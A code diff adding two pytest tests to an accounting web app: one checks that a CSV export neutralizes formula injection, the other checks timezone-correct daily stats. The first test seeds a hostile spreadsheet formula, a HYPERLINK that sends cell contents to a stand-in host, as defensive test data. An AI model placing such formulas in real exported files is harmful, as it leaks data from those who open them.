@@ -130,3 +130,27 @@ def test_stats_covers_one_week_with_daily_series(auth_client, seeded):
     assert sum(p["accepts"] for p in s["daily"]) == 2
     assert sum(p["rejects"] for p in s["daily"]) == 1
     assert [p["username"] for p in s["top_users_7d"]] == ["a"]
+
+
+def test_commands_csv_neutralizes_formulas(auth_client, seeded):
+    seeded.add(CmdAcct(event_time=datetime(2026, 9, 3, 18, 0, 0), nasipaddress="10.0.0.9",
+                       username="=cmd", callingstationid="", action="exec",
+                       command='=HYPERLINK("http://x/?"&A1)', acctsessionid="s9"))
+    seeded.commit()
+    r = auth_client.get("/api/accounting/commands.csv")
+    assert "'=HYPERLINK" in r.text and "'=cmd" in r.text
+
+
+def test_stats_daily_buckets_follow_operator_timezone(auth_client, seeded):
+    from zoneinfo import ZoneInfo
+
+    # 23:30 de ontem em São Paulo = 02:30 UTC de hoje: tem que cair em "ontem"
+    sp = ZoneInfo("America/Sao_Paulo")
+    yesterday = datetime.now(sp).date() - timedelta(days=1)
+    late = datetime(yesterday.year, yesterday.month, yesterday.day, 23, 30, tzinfo=sp)
+    seeded.add(RadPostAuth(username="a", pass_="", reply="Access-Accept",
+                           authdate=late.astimezone(UTC).replace(tzinfo=None)))
+    seeded.commit()
+    daily = auth_client.get("/api/accounting/stats").json()["daily"]
+    assert daily[-2]["date"] == yesterday.isoformat()
+    assert daily[-2]["accepts"] == 1 and daily[-1]["accepts"] == 0
